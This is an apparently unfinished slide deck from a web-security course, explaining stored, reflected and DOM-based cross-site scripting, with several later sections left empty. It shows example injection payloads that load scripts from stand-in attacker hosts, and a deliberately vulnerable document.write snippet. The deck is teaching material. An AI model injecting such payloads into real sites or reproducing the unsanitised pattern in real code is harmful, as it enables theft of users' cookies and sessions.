# Common Attacks

---
 
## Common Attacks List

This module covers the following common attacks:

1. Cross site scripting (XSS)
2. Malicious file execution
3. Session hijacking
4. Encryption
5. Unsecured direct object reference
6. Failure to authorize/hidden URLs
7. Cross site request forgery (CSRF) 

There are other attacks not covered in this module.

OWASP maintains a project identifying the current top ten attacks

// add url

Notes:

---

## Cross Site Scripting (XSS)

- A form of injection attack
- Malicious scripts are injected into a response from a trusted website
  - Because the script is from a trusted source, the user's browser executes it
  - There is no way to tell the script originated from an untrusted source
  - The XSS script has the same level of trust as the website
- Often used to access session tokens, cookies and other information stored in the user's browser


Notes:

---

## Types of XSS Attacks

- There are three types of XSS attacks

- _Stored XSS:_ Known as a persistent or Type I attack
  - The malicious payload is injected into a trusted website
  - The malicious payload is delivered in an HTML page served to a user

- _Reflected XSS:_ Known as a Type II attack
  - A user is tricked into accessing a trusted website using a malformed URL
  - The malformed URL contains the malicious playload
  - The payload is embedded in the HTML response to the malformed URL
  - The attacker "bounces" the script off a trusted website

- _DOM XSS:_ Also known as a Type 0 attack
  - Does not return malicious payload in the response HTML 
  - The payload returned as a URI fragment in response URL 
  - Common attack for sites that use URI fragments to identify the users current page
    - For example, Single Page Applications
  
---

## Persistent XSS Attack

![](../images/cross-site-scripting-example.png)

Notes:

Image credit: https://spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/

---
## Persistent XSS Attack Example

- A trusted blog allows users to post comments
- An attacker posts the following comment which contains a malicious script payload

```html
Well thought out essay, loved it!!
<script>http://attackerwebsite.com/maliciousscript.js</script>
```

- When a user reads the comment from the bloc, the user's browser executes the payload
- The attack payload remains or persists on the server
- Multiple users may become targets of the attack
- Phishing/Social Engineering are used to direct a target to the malicious payload via a posting or email
  - _OMG!!!, can you believe what this guy wrote!!! (link to comment)_


---

## Reflected XSS Attack

![](../images/ReflectedXSS.png)

Notes:

Image Credit: https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a

---

## Reflected XSS Attack

- A user is tricked into clicking on a malformed URL to a trusted website via Phishing or Social Engineering 
  - Common attack vector is to sending the link in an email
- The payload is in the malformed URL
  - Vulnerable websites will return the payload as part of the error response
  - When the response is opened in the user's browser, the payload executes
---

## Reflected XSS Attack Example

- An attacker sends a link to a target in email which looks like:

```html
    https://vulnerablewebsite.com?q=news<\script%20src=”http://evilsite.com/payload.js
```
- The URL description will be deceptive, like "New info that will affect your account"
- A vulnerable website will return the unfiltered content of the query in the error message

```html

    Error “<script type=’text/javascript’>payload</script > not found.”
```
- Once the error page is loaded, the payload is executed in the victim's browser
___

## DOM XSS Attack

![](../images/DOMXss.png)

Notes:

Image Credit: https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd

---

## DOM XSS Attack

- The malicious load is executed by modifying the DOM “environment” in the victim’s browser
- This causes the original client side script to run in an “unexpected” manner
- The HTTP response is not affected, the returned page contains the altered script 
- The client side code executes differently because of the modifications to the script in the DOM environment

---

## DOM XSS Attack Example #1 - Parameter Insertion 

- A website allows users to select their language but uses English as the default like this:

```html
  http://TrustedWebsite.com/page.html?default=English
```
- This is processed by a script like this:

```html
Select your language:

    <select><script>

    document.write("<OPTION value=1>"+decodeURIComponent(document.location.href.substring(document.location.href.indexOf("default=")+8))+"</OPTION>");

    document.write("<OPTION value=2>English</OPTION>");

    </script></select>
```
- The important thing to note is that the URI fragment "Default=English" becomes part of the script

---
## DOM XSS Attack Example #1 - Parameter Insertion

- The attacker social engineers the click on a link like:

```html
  http://TrustedWebsite.com/page.html?default<script>payload</script>
```
- The original Javascript code in the page does not expect the default parameter to contain HTML markup
  - The markup is decoded and echoed into the page's DOM at runtime
  - The browser then renders the infected page and executes the attacker’s script
- The HTTP response does not contain the payload
  - This payload executes as part of the client-side script at runtime
  - The script accesses the trusted DOM variable _document.location_
---
## Malicious File Execution

- Single Page Applications (SPAs) are common with frameworks like Angular and React
- User "location" on the site is stored as a URI fragment

```html

```
Notes:

---

## Defences Against XSS Attacks

- XSS attacks are all injection attacks
  - Require malicious code to be treated as data by a website
- XSS also relies on social engineering like Phishing attacks to get users to click on the link provided by the attacker
- 

---

## Session Hijacking

Notes:

---

## Encryption

Notes:

---

## Unsecured Direct Object Access

- Happens when implementation objects are exposed
  - Eg. Configuration files, credentials, SQL queries
- These objects can then be modified or destroyed
- If implementation directories are accessible
  - Attackers can add new files to compromise the system
- 

Notes:

---

## Hidden URL Authorization Failure

Notes:

---

## Cross Site Request Forgery



Notes:

---


